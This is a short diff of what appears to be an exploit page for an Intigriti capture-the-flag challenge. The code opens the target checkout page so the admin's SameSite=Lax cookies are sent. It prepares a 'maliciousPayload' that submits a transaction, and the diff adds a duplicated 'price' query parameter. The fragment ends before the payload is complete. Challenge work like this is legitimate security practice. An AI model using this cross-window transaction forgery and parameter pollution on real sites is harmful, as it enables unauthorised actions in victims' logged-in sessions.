@@ -13,7 +13,7 @@
         document.getElementById('exploitBtn').onclick = function() {
             // Step 1: Open the vulnerable page in a new tab.
             // This ensures SameSite=Lax cookies ARE sent, so the Admin is logged in.
-            var targetWindow = window.open("https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1");
+            var targetWindow = window.open("https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=&price=1");
 
             var maliciousPayload = {
                 type: 'submitTransaction',
